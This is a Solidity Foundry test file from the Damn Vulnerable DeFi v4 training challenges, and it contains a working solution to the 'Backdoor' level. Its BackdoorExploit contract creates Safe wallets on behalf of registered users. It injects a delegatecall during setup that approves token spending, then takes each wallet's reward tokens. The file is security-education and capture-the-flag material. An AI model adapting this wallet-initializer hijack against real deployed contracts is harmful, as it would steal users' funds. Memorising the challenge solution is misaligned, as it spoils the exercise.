// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
import "safe-smart-account/contracts/proxies/IProxyCreationCallback.sol";

contract BackdoorChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    address[] users = [makeAddr("alice"), makeAddr("bob"), makeAddr("charlie"), makeAddr("david")];

    uint256 constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;

    DamnValuableToken token;
    Safe singletonCopy;
    SafeProxyFactory walletFactory;
    WalletRegistry walletRegistry;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy Safe copy and factory
        singletonCopy = new Safe();
        walletFactory = new SafeProxyFactory();

        // Deploy reward token
        token = new DamnValuableToken();

        // Deploy the registry
        walletRegistry = new WalletRegistry(address(singletonCopy), address(walletFactory), address(token), users);

        // Transfer tokens to be distributed to the registry
        token.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(walletRegistry.owner(), deployer);
        assertEq(token.balanceOf(address(walletRegistry)), AMOUNT_TOKENS_DISTRIBUTED);
        for (uint256 i = 0; i < users.length; i++) {
            // Users are registered as beneficiaries
            assertTrue(walletRegistry.beneficiaries(users[i]));

            // User cannot add beneficiaries
            vm.expectRevert(0x82b42900); // `Unauthorized()`
            vm.prank(users[i]);
            walletRegistry.addBeneficiary(users[i]);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_backdoor() public checkSolvedByPlayer {
        BackdoorExploit exploit = new BackdoorExploit(
            address(singletonCopy), address(walletFactory), address(walletRegistry), address(token), recovery
        );
        exploit.attack(users);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        for (uint256 i = 0; i < users.length; i++) {
            address wallet = walletRegistry.wallets(users[i]);

            // User must have registered a wallet
            assertTrue(wallet != address(0), "User didn't register a wallet");

            // User is no longer registered as a beneficiary
            assertFalse(walletRegistry.beneficiaries(users[i]));
        }

        // Recovery account must own all tokens
        assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
    }
}

contract BackdoorExploit {
    address private immutable singletonCopy; // smart contract wallet, requires specific number of approvals for transactions
    address private immutable walletFactory; // SafeProxyFactory, uses proxy pattern to save gas
    address private immutable walletRegistry; // keeps track of who owns which wallet, gives out rewards for new wallets
    DamnValuableToken private immutable dvt;
    address private immutable recovery;

    constructor(address _masterCopy, address _walletFactory, address _registry, address _token, address _recovery) {
        singletonCopy = _masterCopy;
        walletFactory = _walletFactory;
        walletRegistry = _registry;
        dvt = DamnValuableToken(_token);
        recovery = _recovery;
    }

    function delegateApprove(address _spender) external {
        dvt.approve(_spender, 10 ether);
    }

    function attack(address[] memory _beneficiaries) external {
        for (uint256 i = 0; i < 4; i++) {
            address[] memory beneficiary = new address[](1); // array with one element
            beneficiary[0] = _beneficiaries[i]; //  that is the current user being processed

            // note trap when setting up new Wallet
            // function setup(
            //     address[] calldata _owners,
            //     uint256 _threshold,
            //     address to,
            //     bytes calldata data,
            //     address fallbackHandler,
            //     address paymentToken,
            //     uint256 payment,
            //     address payable paymentReceiver
            // )
            bytes memory _initializer = abi.encodeWithSelector(
                Safe.setup.selector, // Selector for the setup() function call
                beneficiary,
                1, // _threshold =>  Number of required confirmations for a Safe transaction.
                address(this), //  to => Contract address for optional delegate call.
                abi.encodeWithSignature("delegateApprove(address)", address(this)), // // data payload for the optional delegate call
                address(0), //  fallbackHandler
                0,
                0,
                0
            );

            // Create new proxies on behalf of other users
            SafeProxy _newProxy = SafeProxyFactory(walletFactory).createProxyWithCallback(
                singletonCopy, // _singleton => Address of singleton contract.
                _initializer, // initializer => Payload for message call sent to new proxy contract.
                i, // saltNonce => Nonce that will be used to generate the salt to calculate the address of the new proxy contract.
                IProxyCreationCallback(walletRegistry) // callback => Cast walletRegistry to IProxyCreationCallback
            );

            dvt.transferFrom(address(_newProxy), recovery, 10 ether);
        }
    }
}
